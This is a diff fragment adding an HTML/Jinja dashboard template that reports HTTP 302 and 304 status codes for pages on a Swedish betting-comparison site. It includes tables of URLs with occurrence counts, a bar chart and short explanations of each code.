+                                            <!-- Start: #graps -->
+                                            <div class="col-8">
+                                                <!-- Start: #Heading -->
+                                                <div class="row">
+                                                    <h6 class="font-monospace">Total:&nbsp;<span style="font-weight: bold;">10 URLs affected&nbsp; &nbsp;&nbsp;</span><span style="font-weight: bold;"></span></h6>
+                                                </div><!-- End: #Heading -->
+                                                <!-- Start: #Up -->
+                                                <div class="row">
+                                                    <div class="col">
+                                                        <h5><strong>Referring Page&nbsp; &nbsp;&nbsp;</strong><span></span><br></h5>
+                                                        <div class="table-responsive">
+                                                            <table class="table">
+                                                                <thead>
+                                                                    <tr>
+                                                                        <th>URL</th>
+                                                                        <th>OCCURENCE</th>
+                                                                    </tr>
+                                                                </thead>
+                                                                <tbody>
+                                                                    <tr>
+                                                                        <td class="text-truncate"><a href="https://bettingsidor.se/wp-content/cache/autoptimize/js/autoptimize_ac2a7dba699cd416abc31c0d6882e022.js" target="_blank">https://bettingsidor.se/wp-content/cache/autoptimize/js/autoptimize_ac2a7dba699cd416abc31c0d6882e022.js</a><br></td>
+                                                                        <td>8</td>
+                                                                    </tr>
+                                                                    <tr>
+                                                                        <td><a href="https://bettingsidor.se/wp-login.php?saml_sso" target="_blank">https://bettingsidor.se/wp-login.php?saml_sso</a><br></td>
+                                                                        <td>2</td>
+                                                                    </tr>
+                                                                </tbody>
+                                                            </table>
+                                                        </div>
+                                                    </div>
+                                                </div><!-- End: #Up -->
+                                            </div><!-- End: #graps -->
+                                            <!-- Start: #form -->
+                                            <div class="col-4">
+                                                <div class="row">
+                                                    <div><a class="btn btn-primary" data-bs-toggle="collapse" aria-expanded="true" aria-controls="collapse-11" href="#collapse-11" role="button">CODE EXPLANATION</a>
+                                                        <div class="collapse show" id="collapse-11">
+                                                            <p>The HTTP response status code 302 Found is a common way&nbsp;<strong>of performing URL redirection</strong>. ... This is an invitation to the user agent (e.g. a web browser) to make a second, otherwise identical, request to the new URL specified in the location field. The end result is a redirection to the new URL</p>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div><a class="btn btn-primary" data-bs-toggle="collapse" aria-expanded="true" aria-controls="collapse-12" href="#collapse-12" role="button" style="margin-top: 22px;">ADD NOTES</a>
+                                                    <div class="collapse show" id="collapse-12">
+                                                        <p>Add notes here. Use up to 300 words without special characters!</p><textarea style="width: 358px;"></textarea><button class="btn btn-primary" type="button">SAVE</button>
+                                                    </div>
+                                                </div>
+                                            </div><!-- End: #form -->
+                                        </div>
+                                    </div>
+                                </div><!-- End: 500 -->
+                            </div><!-- End: 403 -->
+                        </div>
+                    </div><!-- End: error302 -->
+                    <!-- Start: error304 -->
+                    <div class="row">
+                        <div class="col">
+                            <!-- Start: 403 -->
+                            <div class="card" style="margin-bottom: 0;padding-bottom: 0;">
+                                <!-- Start: 500 -->
+                                <div class="card-body" style="margin-bottom: 0;">
+                                    <h4 class="card-title" style="background: #346888;color: var(--bs-light);font-weight: bold;"><i class="fa fa-commenting-o"></i><i class="fa fa-download float-sm-end" style="font-size: 32px;color: var(--bs-gray-100);" title="Download"></i>&nbsp; &nbsp; &nbsp;Status Code 304 -&nbsp;<strong>&nbsp;Not modified since last visit</strong><br></h4>
+                                    <div class="container">
+                                        <div class="row justify-content-md-center">
+                                            <!-- Start: #graps -->
+                                            <div class="col-8">
+                                                <!-- Start: #Heading -->
+                                                <div class="row">
+                                                    <h6 class="font-monospace">Total:&nbsp;<span style="font-weight: bold;">1146 URLs affected&nbsp; &nbsp;&nbsp;</span><span style="font-weight: bold;"></span></h6>
+                                                </div><!-- End: #Heading -->
+                                                <!-- Start: #Up -->
+                                                <div class="row">
+                                                    <div class="col">
+                                                        <h5><strong>Referring Page&nbsp; &nbsp;&nbsp;</strong><span></span><br></h5>
+                                                        <div class="table-responsive">
+                                                            <table class="table">
+                                                                <thead>
+                                                                    <tr>
+                                                                        <th>URL</th>
+                                                                        <th>OCCURENCE</th>
+                                                                    </tr>
+                                                                </thead>
+                                                                <tbody>
+                                                                    <tr>
+                                                                        <td class="text-truncate"><a href="https://bettingsidor.se/snabba-uttag/" target="_blank">https://bettingsidor.se/snabba-uttag/</a><br></td>
+                                                                        <td>118</td>
+                                                                    </tr>
+                                                                    <tr>
+                                                                        <td><a href="https://bettingsidor.se/odds/eurovision/" target="_blank">https://bettingsidor.se/odds/eurovision/</a><br></td>
+                                                                        <td>67</td>
+                                                                    </tr>
+                                                                    <tr>
+                                                                        <td><a href="https://bettingsidor.se/betalningsmetoder/visa/" target="_blank">https://bettingsidor.se/betalningsmetoder/visa/</a><br></td>
+                                                                        <td>61</td>
+                                                                    </tr>
+                                                                    <tr>
+                                                                        <td><a href="https://bettingsidor.se/utan-registrering/" target="_blank">https://bettingsidor.se/utan-registrering/</a><br></td>
+                                                                        <td>58</td>
+                                                                    </tr>
+                                                                    <tr>
+                                                                        <td><a href="https://bettingsidor.se/odds/mma/" target="_blank">https://bettingsidor.se/odds/mma/</a><br></td>
+                                                                        <td>57</td>
+                                                                    </tr>
+                                                                </tbody>
+                                                            </table>
+                                                        </div>
+                                                    </div>
+                                                </div><!-- End: #Up -->
+                                                <div class="col">
+                                                    <!-- Start: Bar Chart -->
+                                                    <div class="chart-area" style="color: rgb(133,135,150);"><canvas data-bss-chart="{&quot;type&quot;:&quot;horizontalBar&quot;,&quot;data&quot;:{&quot;labels&quot;:[&quot;image&quot;,&quot;category&quot;,&quot;page&quot;],&quot;datasets&quot;:[{&quot;label&quot;:&quot;Redirection&quot;,&quot;backgroundColor&quot;:&quot;#c1e7ff&quot;,&quot;borderColor&quot;:&quot;#c1e7ff&quot;,&quot;borderWidth&quot;:&quot;2&quot;,&quot;data&quot;:[&quot;14984&quot;,&quot;7841&quot;,&quot;9821&quot;]}]},&quot;options&quot;:{&quot;maintainAspectRatio&quot;:false,&quot;legend&quot;:{&quot;display&quot;:false,&quot;labels&quot;:{&quot;fontStyle&quot;:&quot;normal&quot;}},&quot;title&quot;:{&quot;fontStyle&quot;:&quot;normal&quot;},&quot;scales&quot;:{&quot;xAxes&quot;:[{&quot;gridLines&quot;:{&quot;color&quot;:&quot;rgb(234, 236, 244)&quot;,&quot;zeroLineColor&quot;:&quot;rgb(234, 236, 244)&quot;,&quot;drawBorder&quot;:false,&quot;drawTicks&quot;:false,&quot;borderDash&quot;:[&quot;2&quot;],&quot;zeroLineBorderDash&quot;:[&quot;2&quot;],&quot;drawOnChartArea&quot;:false},&quot;ticks&quot;:{&quot;fontColor&quot;:&quot;#858796&quot;,&quot;fontStyle&quot;:&quot;normal&quot;,&quot;padding&quot;:20}}],&quot;yAxes&quot;:[{&quot;gridLines&quot;:{&quot;color&quot;:&quot;rgb(234, 236, 244)&quot;,&quot;zeroLineColor&quot;:&quot;rgb(234, 236, 244)&quot;,&quot;drawBorder&quot;:false,&quot;drawTicks&quot;:false,&quot;borderDash&quot;:[&quot;2&quot;],&quot;zeroLineBorderDash&quot;:[&quot;2&quot;]},&quot;ticks&quot;:{&quot;fontColor&quot;:&quot;#858796&quot;,&quot;fontStyle&quot;:&quot;normal&quot;,&quot;padding&quot;:20}}]}}}"></canvas></div><!-- End: Bar Chart -->
+                                                </div>
+                                            </div><!-- End: #graps -->
+                                            <!-- Start: #form -->
+                                            <div class="col-4">
+                                                <div class="row">
+                                                    <div><a class="btn btn-primary" data-bs-toggle="collapse" aria-expanded="true" aria-controls="collapse-13" href="#collapse-13" role="button">CODE EXPLANATION</a>
+                                                        <div class="collapse show" id="collapse-13">
+                                                            <p><br>304 means Firefox is sending a&nbsp;<strong>"If-Modified-Since" conditional request</strong>&nbsp;to the Web server. If the file has not been updated since the date sent by the browser, the Web server returns a 304 response which essentially tells Firefox to use its cached version.</p>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div><a class="btn btn-primary" data-bs-toggle="collapse" aria-expanded="true" aria-controls="collapse-14" href="#collapse-14" role="button" style="margin-top: 22px;">ADD NOTES</a>
+                                                    <div class="collapse show" id="collapse-14">
+                                                        <p>Add notes here. Use up to 300 words without special characters!</p><textarea style="width: 358px;"></textarea><button class="btn btn-primary" type="button">SAVE</button>
+                                                    </div>
+                                                </div>
+                                            </div><!-- End: #form -->
+                                        </div>
+                                    </div>
+                                </div><!-- End: 500 -->
+                            </div><!-- End: 403 -->
+                        </div>
+                    </div><!-- End: error304 -->
+                </div><!-- End: #mainContainer -->
+            </div>
+            <footer class="text-start bg-white sticky-footer" style="background: rgb(255, 255, 255);">
+                <div class="container my-auto">
+                    <div class="text-center my-auto copyright"><span>Copyright © Better Collective 2021</span></div>
+                </div>
+            </footer>
+        </div><a class="border rounded d-inline scroll-to-top" href="#page-top"><i class="fas fa-angle-up"></i></a>
+    </div>
+    {% include 'footer.html' %}
+{% include 'scripts.html' %}
+</body>
+
+{% endblock content %}
